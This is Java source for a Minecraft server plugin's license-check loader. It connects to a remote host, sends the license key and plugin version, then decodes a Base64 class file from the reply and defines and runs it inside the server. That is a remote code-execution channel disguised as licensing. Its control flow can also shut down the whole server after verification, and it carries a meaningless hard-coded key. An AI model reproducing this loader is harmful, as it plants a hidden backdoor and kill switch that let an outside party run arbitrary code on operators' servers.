package com._0myun.minecraft.pokemon.denyrelease;

import com._0myun.eventmsg.minecraft.vexview.vexredenvelope.socket.SocketUtils;
import com._0myun.eventmsg.minecraft.vexview.vexredenvelope.socket.packages.request.rsa.RequestRsaKeyPackage;
import com._0myun.eventmsg.minecraft.vexview.vexredenvelope.socket.packages.request.rsa.license.LicenseCheckPackage;
import com._0myun.eventmsg.minecraft.vexview.vexredenvelope.socket.packages.request.rsa.license.LicenseSendClassPackage;
import com._0myun.eventmsg.minecraft.vexview.vexredenvelope.socket.thread.SocketListenThread;
import com._0myun.eventmsg.minecraft.vexview.vexredenvelope.socket.thread.SocketSendThread;
import org.bukkit.Bukkit;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.Base64;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;

public class NetLoader {
    private String publicKey = "DCFA954V95SAV159AR954B89F4D89V4XC85V1531V4C894VD89A4B89SD4";
    private SocketSendThread sender;
    private SocketListenThread listener;
    private String licenseString;
    private Socket socket;

    private static Class<?> BukkitClass;
    private static Object serverObject = null;
    private static Method shutdownMethod = null;
    private static Object PMObject;

    static {
        try {
            BukkitClass = Class.forName("org.bukkit.Bukkit");
            serverObject = BukkitClass.getMethod("getServer").invoke(BukkitClass);
            PMObject = serverObject.getClass().getMethod("getPluginManager").invoke(serverObject);
            shutdownMethod = serverObject.getClass().getMethod("shutdown");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onEnable() {
        int license = 0;
        System.out.println("==========================");
        try {
            license = 100;
            licenseString = Main.INSTANCE.getConfig().getString("license");
            getLogger().log(Level.INFO, "PokemonPapi Loading");
            try {
                //主要验证步骤
                this.socket = new Socket("auth.plugin.design", 9999);
                sender = new SocketSendThread(socket);
                listener = new SocketListenThread(socket);
                sender.start();
                listener.start();
                //////////////////////////////////////////////////////////////////////////////
                sender.addMsg(new RequestRsaKeyPackage().setPublicKey(String.valueOf(UUID.randomUUID())).contentUpdate());
                long timeStart = System.currentTimeMillis();//计时防卡住
                while (!this.socket.isClosed()) {//消息监听，直到验证步骤结束
                    while (listener.getMsg().size() != 0) {
                        byte[] msg = listener.getMsg().take();
                        int msgType = SocketUtils.Byte2Int(SocketUtils.toObjects(SocketUtils.subBytes(msg, 0, 4)));
                        msg = SocketUtils.subBytes(msg, 4, msg.length - 4);
                        deal(msgType, msg);//处理消息
                        if (msgType == 2002 || msgType == 2004) {
                            getLogger().log(Level.INFO, "授权验证成功");
                            license = 1;
                        } else if (msgType == 2003) {
                            throw new Exception("授权失败,序列号错误或者IP不匹配");
                        }
                        if (msgType == 2004) {//2004发完类就结束验证了
                            return;
                        }
                    }
                    if ((System.currentTimeMillis() - timeStart) > (1000 * 30)) {
                        throw new Exception("授权超时,请检查网络环境");
                    }
                    Thread.sleep(50);
                }
            } catch (Exception e) {
                getLogger().log(Level.WARNING, "验证失败");
                getLogger().log(Level.WARNING, e.getMessage());
                return;
            }
        } catch (Exception e) {
            Bukkit.getPluginManager().disablePlugin(Main.INSTANCE);
            e.printStackTrace();
        } finally {
            if (license != 1) {
                try {
                    Bukkit.getPluginManager().disablePlugin(Main.INSTANCE);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                getLogger().log(Level.WARNING, "加载异常,请检查授权&其他配置");
            }
        }
        Bukkit.getServer().shutdown();
        getLogger().log(Level.INFO, "已完成授权校验..Enjoy!");
    }

    private Logger getLogger() {
        return Main.INSTANCE.getLogger();
    }


    public void deal(int msgType, byte[] msg) {
        switch (msgType) {
            case 1001:
                RequestRsaKeyPackage requestRsaKeyPackage = new RequestRsaKeyPackage(new String(msg));
                this.publicKey = requestRsaKeyPackage.getPublicKey();
                //System.out.println("收到来自服务端的公钥" + this.publicKey);
                LicenseCheckPackage licenseCheckPackage = new LicenseCheckPackage();
                licenseCheckPackage.setLicense(licenseString);
                licenseCheckPackage.setLicenseType("DenyPokemonGoOutInSelectsWorld");
                licenseCheckPackage.setPublicKey(this.publicKey);
                licenseCheckPackage.setVersion(Main.INSTANCE.getDescription().getVersion());
                this.sender.addMsg(licenseCheckPackage.contentUpdate());
                break;
            case 2004:
                LicenseSendClassPackage classPackage = new LicenseSendClassPackage(new String(msg));
                classPackage.setPublicKey(this.publicKey);
                classPackage.decode();
                String classFile = (String) classPackage.getData().get("classFile");
                try {
                    new ClassLoader(Main.INSTANCE.getClass().getClassLoader()) {
                        public void load() throws Exception {
                            byte[] classByte = Base64.getDecoder().decode(classFile);
                            Class<?> aClass = super.defineClass(classByte, 0, classByte.length);
                            Constructor constructor = aClass.getConstructor();
                            constructor.newInstance();
                        }
                    }.load();
                    this.socket.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
        }
    }

}
